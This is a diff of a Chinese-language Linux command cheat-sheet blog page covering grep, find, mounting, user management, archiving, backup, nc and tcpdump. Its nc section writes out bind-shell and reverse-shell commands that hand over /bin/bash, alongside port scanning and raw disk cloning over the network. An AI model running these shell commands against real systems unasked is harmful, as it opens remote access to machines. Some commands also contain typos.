+<p>-v 反向选择，即显示不包含匹配文本的所有行</p>
+</li>
+<li><p>grep正则表达式元字符集（基本集）</p>
+<p>^ 行的开始  如：’^grep’匹配所有以grep开头的行。</p>
+<p>$ 行的结束 如：’grep$’匹配所有以grep结尾的行。</p>
+<p>. 匹配一个非换行符的字符 如：’gr.p’匹配gr后接一个任意字符，然后是p。</p>
+<p>*匹配零个或多个先前字符 如：’grep’匹配所有一个或多个空格后紧跟grep的行。</p>
+<p>.*一起用代表任意字符。</p>
+<p>[] 匹配一个指定范围内的字符，如’[Gg]rep’匹配Grep和grep。</p>
+<p>[^] 匹配一个不在指定范围内的字符，如：’[^A-FH-Z]rep’匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。</p>
+<p>&#x2F;(..&#x2F;) 标记匹配字符，如’&#x2F;(love&#x2F;)’，love被标记为1。</p>
+<p>&#x2F;&lt; 锚定单词的开始</p>
+<p>&#x2F;&gt; 锚定单词的结束，如’grep&#x2F;&gt;’匹配包含以grep结尾的单词的行。</p>
+<p>例：</p>
+</li>
+<li><p>统计所有以“us”字符开头的行有多少 </p>
+<p>grep -c “us” test.txt </p>
+</li>
+<li><p>不区分大小写查找“May”所有的行 </p>
+<p>grep -i “May” test.txt </p>
+</li>
+<li><p>显示行号；显示匹配字符“user”的行及行号</p>
+<p>grep -n “user” test.txt </p>
+</li>
+<li><p>显示输出没有字符“user”所有的行</p>
+<p>grep -v “user” test.txt </p>
+</li>
+<li><p>显示输出字符“user”所在的行</p>
+<p>grep “user” test.txt </p>
+</li>
+<li><p>搜索有the的行,并输出行号</p>
+<p>grep -n ‘the’ regular_express.txt</p>
+</li>
+<li><p>搜 索没有the的行,并输出行号</p>
+<p>grep -nv ‘the’ regular_express.txt</p>
+</li>
+</ul>
+<h2 id="9-2-find"><a href="#9-2-find" class="headerlink" title="9.2 find"></a>9.2 find</h2><ul>
+<li><p>从 ‘&#x2F;‘ 开始进入根文件系统搜索文件和目录  </p>
+<p>find &#x2F; -name file1 </p>
+</li>
+<li><p>搜索属于用户 ‘user1’ 的文件和目录  </p>
+<p>find &#x2F; -user user1 </p>
+</li>
+<li><p>在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件 </p>
+<p> find &#x2F;home&#x2F;user1 -name *.bin </p>
+</li>
+<li><p>搜索在过去100天内未被使用过的执行文件 </p>
+<p>find &#x2F;usr&#x2F;bin -type f -atime +100  </p>
+</li>
+<li><p>搜索在10天内被创建或者修改过的文件 </p>
+<p> find &#x2F;usr&#x2F;bin -type f -mtime -10 </p>
+</li>
+<li><p>搜索以 ‘.rpm’ 结尾的文件并定义其权限 </p>
+<p>find &#x2F; -name *.rpm -exec chmod 755 ‘{}’ ; </p>
+</li>
+<li><p>搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备  </p>
+<p>find &#x2F; -xdev -name *.rpm </p>
+</li>
+<li><p>显示一个二进制文件、源码或man的位置  </p>
+<p>whereis halt </p>
+</li>
+<li><p>显示一个二进制文件或可执行文件的完整路径 </p>
+<p>which halt</p>
+</li>
+</ul>
 <h2 id="9-3-locate"><a href="#9-3-locate" class="headerlink" title="9.3 locate"></a>9.3 locate</h2><p>寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令  locate *.ps </p>
 <h1 id="10-挂载"><a href="#10-挂载" class="headerlink" title="10.挂载"></a>10.挂载</h1><h2 id="10-1-mount"><a href="#10-1-mount" class="headerlink" title="10.1 mount"></a>10.1 mount</h2><p>挂载一个叫做hda2的盘到&#x2F;mnt&#x2F;hda2路径 mount &#x2F;dev&#x2F;hda2 &#x2F;mnt&#x2F;hda2<br>其他挂载上同</p>
 <h2 id="10-2-umount"><a href="#10-2-umount" class="headerlink" title="10.2 umount"></a>10.2 umount</h2><p>卸载一个叫做hda2的盘 - 先从挂载点 ‘&#x2F; mnt&#x2F;hda2’ 退出  umount &#x2F;dev&#x2F;hda2<br>当设备繁忙时强制卸载   fuser -km &#x2F;mnt&#x2F;hda2<br>运行卸载操作而不写入 &#x2F;etc&#x2F;mtab 文件- 当文件为只读或当磁盘写满时非常有用  umount -n &#x2F;mnt&#x2F;hda2 </p>
-<h1 id="11-用户和群组"><a href="#11-用户和群组" class="headerlink" title="11.用户和群组"></a>11.用户和群组</h1><p>groupadd group_name 创建一个新用户组<br> groupdel group_name 删除一个用户组<br> groupmod -n new_group_name old_group_name 重命名一个用户组<br> useradd -c “Name Surname “ -g admin -d &#x2F;home&#x2F;user1 -s &#x2F;bin&#x2F;bash user1 创建一个属于 “admin” 用户组的用户<br> useradd user1 创建一个新用户<br> userdel -r user1 删除一个用户 ( ‘-r’ 排除主目录)<br> usermod -c “User FTP” -g system -d &#x2F;ftp&#x2F;user1 -s &#x2F;bin&#x2F;nologin user1 修改用户属性<br> passwd 修改口令<br> passwd user1 修改一个用户的口令 (只允许root执行)<br> chage -E 2005-12-31 user1 设置用户口令的失效期限<br> pwck 检查 ‘&#x2F;etc&#x2F;passwd’ 的文件格式和语法修正以及存在的用户<br> grpck 检查 ‘&#x2F;etc&#x2F;passwd’ 的文件格式和语法修正以及存在的群组<br> newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 </p>
-<h1 id="12-打包和压缩"><a href="#12-打包和压缩" class="headerlink" title="12.打包和压缩"></a>12.打包和压缩</h1><h2 id="12-1-rar"><a href="#12-1-rar" class="headerlink" title="12.1 rar"></a>12.1 rar</h2><p>创建一个叫做 ‘file1.rar’ 的包  rar a file1.rar test_file<br>同时压缩 ‘file1’, ‘file2’ 以及目录 ‘dir1’  rar a file1.rar file1 file2 dir1<br>解压rar包  rar x file1.rar、 unrar x file1.rar<br>创建一个非压缩的 tar包  tar -cvf archive.tar file1<br>释放一个包  tar -xvf archive.tar<br>将压缩包释放到 &#x2F;tmp目录下  tar -xvf archive.tar -C &#x2F;tmp<br>创建一个bzip2格式的压缩包  tar -cvfj archive.tar.bz2 dir1<br>解压一个bzip2格式的压缩包  tar -jxvf archive.tar.bz2<br>创建一个gzip格式的压缩包  tar -cvfz archive.tar.gz dir1<br> 解压一个gzip格式的压缩包  tar -zxvf archive.tar.gz</p>
-<h2 id="12-2-zip"><a href="#12-2-zip" class="headerlink" title="12.2 zip"></a>12.2 zip</h2><p>创建一个zip格式的压缩包  zip file1.zip file1<br>将几个文件和目录同时压缩成一个zip格式的压缩包  zip -r file1.zip file1 file2 dir1<br>解压一个zip格式压缩包  unzip file1.zip<br>压缩一个叫做 ‘file1’的文件  gzip file1<br> 最大程度压缩  gzip -9 file1</p>
-<h1 id="13-备份"><a href="#13-备份" class="headerlink" title="13.备份"></a>13.备份</h1><p>制作一个 ‘&#x2F;home’ 目录的完整备份 dump -0aj -f &#x2F;tmp&#x2F;home0.bak &#x2F;home<br>制作一个 ‘&#x2F;home’ 目录的交互式备份  dump -1aj -f &#x2F;tmp&#x2F;home0.bak &#x2F;home<br>还原一个交互式备份  restore -if &#x2F;tmp&#x2F;home0.bak<br>通过ssh和压缩将一个远程目录同步到本地目录  rsync -az -e ssh –delete ip_addr:&#x2F;home&#x2F;public &#x2F;home&#x2F;local<br>通过ssh和压缩将本地目录同步到远程目录 rsync -az -e ssh –delete &#x2F;home&#x2F;local ip_addr:&#x2F;home&#x2F;public<br>备份磁盘内容到一个文件  dd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D;&#x2F;tmp&#x2F;file1<br> rsync</p>
-<h1 id="14-网络"><a href="#14-网络" class="headerlink" title="14.网络"></a>14.网络</h1><p>ifconfig eth0 显示一个以太网卡的配置<br> ifup eth0 启用一个 ‘eth0’ 网络设备<br> ifdown eth0 禁用一个 ‘eth0’ 网络设备<br> ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址<br> ifconfig eth0 promisc 设置 ‘eth0’ 成混杂模式以嗅探数据包 (sniffing)<br> dhclient eth0 以dhcp模式启用 ‘eth0’<br> route -n show routing table<br> route add -net 0&#x2F;0 gw IP_Gateway configura default gateway<br> route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network ‘192.168.0.0&#x2F;16’<br> route del 0&#x2F;0 gw IP_gateway remove static route<br> echo “1” &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward activate ip routing<br> hostname show hostname of system<br> host <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup hostname to resolve name to ip address and viceversa<br> nslookup <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup hostname to resolve name to ip address and viceversa<br> ip link show show link status of all interfaces<br> mii-tool eth0 show link status of ‘eth0’<br> ethtool eth0 show statistics of network card ‘eth0’<br> netstat -tup show all active network connections and their PID<br> netstat -tupl show all network services listening on the system and their PID<br> tcpdump tcp port 80 show all HTTP traffic<br> iwlist scan show wireless networks<br> iwconfig eth1 show configuration of a wireless network card<br> hostname show hostname<br> host <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup hostname to resolve name to ip address and viceversa<br> nslookup <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup hostname to resolve name to ip address and viceversa<br> whois <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> lookup on Whois database</p>
-<h2 id="14-1-nc"><a href="#14-1-nc" class="headerlink" title="14.1 nc"></a>14.1 nc</h2><p>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。<br>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。<br>-h 在线帮助。<br>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。<br>-l 使用监听模式，管控传入的资料。<br>-n 直接使用IP地址，而不通过域名服务器。<br>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。<br>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。<br>-r 乱数指定本地与远端主机的通信端口。<br>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。<br>-u 使用UDP传输协议。<br>-v 显示指令执行过程。<br>-w&lt;超时秒数&gt; 设置等待连线的时间。<br>-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</p>
-<h3 id="14-1-1-端口扫描，测试端口"><a href="#14-1-1-端口扫描，测试端口" class="headerlink" title="14.1.1 端口扫描，测试端口"></a>14.1.1 端口扫描，测试端口</h3><p>tcp<br>nc -v -z -w 2 192.168.0.3 1-100<br>udp<br>nc -u -v -z -w 2 192.168.0.3 1-100 </p>
-<h3 id="14-1-2-远程拷贝文件"><a href="#14-1-2-远程拷贝文件" class="headerlink" title="14.1.2 远程拷贝文件"></a>14.1.2 远程拷贝文件</h3><p>server1 拷贝文件到server2<br>1：需要先在server2，用nc激活监听<br>     server2       nc -l 1234  &gt;1234.txt<br>     server1       nc -w 1 192.168.1.1 1234 &lt; abc.txt</p>
+<h1 id="11-用户和群组"><a href="#11-用户和群组" class="headerlink" title="11.用户和群组"></a>11.用户和群组</h1><ul>
+<li><p>创建一个新用户组 </p>
+<p>groupadd group_name </p>
+</li>
+<li><p>删除一个用户组 </p>
+<p>groupdel group_name</p>
+</li>
+<li><p>创建一个新用户 </p>
+<p>useradd user1 </p>
+</li>
+<li><p>删除一个用户  </p>
+<p>userdel -r user1</p>
+</li>
+<li><p>重命名一个用户组 </p>
+<p>groupmod -n new_group_name old_group_name</p>
+</li>
+<li><p>创建一个属于 “admin” 用户组的用户 </p>
+<p>useradd -c “Name Surname “ -g admin -d &#x2F;home&#x2F;user1 -s &#x2F;bin&#x2F;bash user1 </p>
+</li>
+<li><p>修改用户属性  </p>
+<p>usermod -c “User FTP” -g system -d &#x2F;ftp&#x2F;user1 -s &#x2F;bin&#x2F;nologin user1 </p>
+</li>
+<li><p>修改口令  </p>
+<p>passwd </p>
+</li>
+<li><p>修改一个用户的口令 (只允许root执行)  </p>
+<p>passwd user1 </p>
+</li>
+<li><p>设置用户口令的失效期限  </p>
+<p>chage -E 2005-12-31 user1 </p>
+</li>
+<li><p>检查 ‘&#x2F;etc&#x2F;passwd’ 的文件格式和语法修正以及存在的用户  </p>
+<p>pwck </p>
+</li>
+<li><p>检查 ‘&#x2F;etc&#x2F;passwd’ 的文件格式和语法修正以及存在的群组 </p>
+<p>grpck</p>
+</li>
+</ul>
+<h1 id="12-打包和压缩"><a href="#12-打包和压缩" class="headerlink" title="12.打包和压缩"></a>12.打包和压缩</h1><h2 id="12-1-rar"><a href="#12-1-rar" class="headerlink" title="12.1 rar"></a>12.1 rar</h2><ul>
+<li><p>创建一个叫做 ‘file1.rar’ 的包  </p>
+<p>rar a file1.rar test_file </p>
+</li>
+<li><p>同时压缩 ‘file1’, ‘file2’ 以及目录 ‘dir1’  </p>
+<p>rar a file1.rar file1 file2 dir1 </p>
+</li>
+<li><p>解压rar包  </p>
+<p>rar x file1.rar、 unrar x file1.rar</p>
+</li>
+<li><p>创建一个非压缩的 tar包  </p>
+<p>tar -cvf archive.tar file1 </p>
+</li>
+<li><p>释放一个包  </p>
+<p>tar -xvf archive.tar </p>
+</li>
+<li><p>将压缩包释放到 &#x2F;tmp目录下 </p>
+<p>tar -xvf archive.tar -C &#x2F;tmp </p>
+</li>
+<li><p>创建一个bzip2格式的压缩包 </p>
+<p> tar -cvfj archive.tar.bz2 dir1 </p>
+</li>
+<li><p>解压一个bzip2格式的压缩包  </p>
+<p>tar -jxvf archive.tar.bz2 </p>
+</li>
+<li><p>创建一个gzip格式的压缩包  </p>
+<p>tar -cvfz archive.tar.gz dir1 </p>
+</li>
+<li><p>解压一个gzip格式的压缩包  </p>
+<p>tar -zxvf archive.tar.gz</p>
+</li>
+</ul>
+<h2 id="12-2-zip"><a href="#12-2-zip" class="headerlink" title="12.2 zip"></a>12.2 zip</h2><ul>
+<li><p>创建一个zip格式的压缩包  </p>
+<p>zip file1.zip file1 </p>
+</li>
+<li><p>将几个文件和目录同时压缩成一个zip格式的压缩包  </p>
+<p>zip -r file1.zip file1 file2 dir1 </p>
+</li>
+<li><p>解压一个zip格式压缩包  </p>
+<p>unzip file1.zip </p>
+</li>
+<li><p>压缩一个叫做 ‘file1’的文件 </p>
+<p> gzip file1 </p>
+</li>
+<li><p>最大程度压缩  </p>
+<p>gzip -9 file1</p>
+</li>
+</ul>
+<h1 id="13-备份"><a href="#13-备份" class="headerlink" title="13.备份"></a>13.备份</h1><ul>
+<li><p>制作一个 ‘&#x2F;home’ 目录的完整备份 </p>
+<p>dump -0aj -f &#x2F;tmp&#x2F;home0.bak &#x2F;home </p>
+</li>
+<li><p>制作一个 ‘&#x2F;home’ 目录的交互式备份  </p>
+<p>dump -1aj -f &#x2F;tmp&#x2F;home0.bak &#x2F;home </p>
+</li>
+<li><p>还原一个交互式备份  </p>
+<p>restore -if &#x2F;tmp&#x2F;home0.bak </p>
+</li>
+<li><p>通过ssh和压缩将一个远程目录同步到本地目录  </p>
+<p>rsync -az -e ssh –delete ip_addr:&#x2F;home&#x2F;public &#x2F;home&#x2F;local </p>
+</li>
+<li><p>通过ssh和压缩将本地目录同步到远程目录 </p>
+<p>rsync -az -e ssh –delete &#x2F;home&#x2F;local ip_addr:&#x2F;home&#x2F;public  </p>
+</li>
+<li><p>备份磁盘内容到一个文件  </p>
+<p>dd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D;&#x2F;tmp&#x2F;file1</p>
+</li>
+</ul>
+<h1 id="14-网络"><a href="#14-网络" class="headerlink" title="14.网络"></a>14.网络</h1><h2 id="14-1-nc"><a href="#14-1-nc" class="headerlink" title="14.1 nc"></a>14.1 nc</h2><p>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。<br>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。<br>-h 在线帮助。<br>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。<br>-l 使用监听模式，管控传入的资料。<br>-n 直接使用IP地址，而不通过域名服务器。<br>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码输出该文件保存。<br>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。<br>-r 乱数指定本地与远端主机的通信端口。<br>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。<br>-u 使用UDP传输协议。<br>-v 显示指令执行过程。<br>-w&lt;超时秒数&gt; 设置等待连线的时间。<br>-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</p>
+<h3 id="14-1-1-端口扫描，测试端口"><a href="#14-1-1-端口扫描，测试端口" class="headerlink" title="14.1.1 端口扫描，测试端口"></a>14.1.1 端口扫描，测试端口</h3><ul>
+<li><p>tcp</p>
+<p>nc -v -z -w 2 192.168.0.3 1-100 </p>
+</li>
+<li><p>udp</p>
+<p>nc -u -v -z -w 2 192.168.0.3 1-100</p>
+</li>
+</ul>
+<h3 id="14-1-2-远程拷贝文件"><a href="#14-1-2-远程拷贝文件" class="headerlink" title="14.1.2 远程拷贝文件"></a>14.1.2 远程拷贝文件</h3><p>server1 拷贝文件到server2<br>1：需要先在server2，用nc激活监听<br>    【server2】       nc -l 1234  &gt;1234.txt<br>    【server1】       nc -w 1 192.168.1.1 1234 &lt; abc.txt</p>
 <h3 id="14-1-3-克隆设备"><a href="#14-1-3-克隆设备" class="headerlink" title="14.1.3 克隆设备"></a>14.1.3 克隆设备</h3><p>【server】    dd if&#x3D; &#x2F;dev&#x2F;sda | nc -l 20000<br>【client 】      nc -n 192.168.1.1 20000 | dd of&#x3D;&#x2F;dev&#x2F;sda</p>
 <h3 id="14-1-4-打开shell"><a href="#14-1-4-打开shell" class="headerlink" title="14.1.4 打开shell"></a>14.1.4 打开shell</h3><p>【server】    nc -l 20000 -e &#x2F;bin&#x2F;bash -i<br>【client 】    nc 192.168.1.1 20000</p>
 <h3 id="14-1-5-反向shell"><a href="#14-1-5-反向shell" class="headerlink" title="14.1.5 反向shell"></a>14.1.5 反向shell</h3><p>【server】    nc -l 20000<br>【client 】    nc 192.168.1.1 20000 -e &#x2F;bin&#x2F;bash</p>
@@ -507,7 +876,35 @@
 <p>ethtool -p eth0</p>
 </li>
 </ul>
-<h2 id="14-5-tcpdump"><a href="#14-5-tcpdump" class="headerlink" title="14.5 tcpdump"></a>14.5 tcpdump</h2><h1 id="15-安装包管理"><a href="#15-安装包管理" class="headerlink" title="15.安装包管理"></a>15.安装包管理</h1><h2 id="15-1-rpm"><a href="#15-1-rpm" class="headerlink" title="15.1 rpm"></a>15.1 rpm</h2><ul>
+<h2 id="14-5-tcpdump"><a href="#14-5-tcpdump" class="headerlink" title="14.5 tcpdump"></a>14.5 tcpdump</h2><p>TCPDump可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p>
+<p> 参数较多，不一一罗列了，举一些常用的例子，如下:</p>
+<ul>
+<li><p>监听指定网卡的所有传输数据 </p>
+<p>tcpdump -i eth0 -nnvv</p>
+</li>
+<li><p>捕获特定主机经过本机网卡eth0的所有数据包 </p>
+<p>tcpdump -i eth0 host x.x.x.x -nnvv</p>
+</li>
+<li><p>监听udp的53端口的数据包  </p>
+<p>tcpdump udp port 53 -nnvv</p>
+</li>
+<li><p>捕获主机A接收和发出的tcp协议的ssh的数据包 </p>
+<p>tcpdump tcp port 22 and host x.x.x.x -nnvv</p>
+</li>
+<li><p>捕获主机 A 和主机B或主机C的所有通信数据包 </p>
+<p>tcpdump hostx.x.x.x and (x.x.x.x or x.x.x.x )  -nnvv</p>
+</li>
+<li><p>捕获源主机1.1.1.1且源端口为443到目的主机2.2.2.2主机的通信 </p>
+<p>tcpdump src host 1.1.1.1 amd src port 443 and dst host 2.2.2.2 and dst port 443</p>
+</li>
+<li><p>抓包文件输出至指定文件  </p>
+<p>tcpdump -i eth0 -w &#x2F;home&#x2F;capture.pcap</p>
+</li>
+<li><p>获取主机A除了和主机B之外所有主机通信的ip包 </p>
+<p>tcpdump ip host A.x.x.x and ! B.x.x.x</p>
+</li>
+</ul>
+<h1 id="15-安装包管理"><a href="#15-安装包管理" class="headerlink" title="15.安装包管理"></a>15.安装包管理</h1><h2 id="15-1-rpm"><a href="#15-1-rpm" class="headerlink" title="15.1 rpm"></a>15.1 rpm</h2><ul>
 <li><p>安装一个rpm包 </p>
 <p>rpm -ivh package.rpm </p>
 </li>
@@ -616,7 +1013,7 @@
                         <div class="col-lg-12">
                             <!-- title -->
                             <h5 class="trm-mb-40 trm-title-with-divider">
-                                其他文章
+                                Other Articles
                                 <span data-number="02"></span>
                             </h5>
                         </div>
@@ -630,7 +1027,7 @@
         <div class="trm-card-descr">
             <div class="trm-label trm-category trm-mb-20">
                 <a href=" #.">
-                    未分类
+                    unclassified
                 </a>
             </div>
             <h5>
@@ -670,9 +1067,9 @@
         </span>
     </div>
     <div class="trm-label">
-        博客已萌萌哒运行:
+        The blog has been lovely to run:
         <span id="since" class="trm-accent-color"></span>
-        天
+        day
     </div>
 </footer>
 <script>
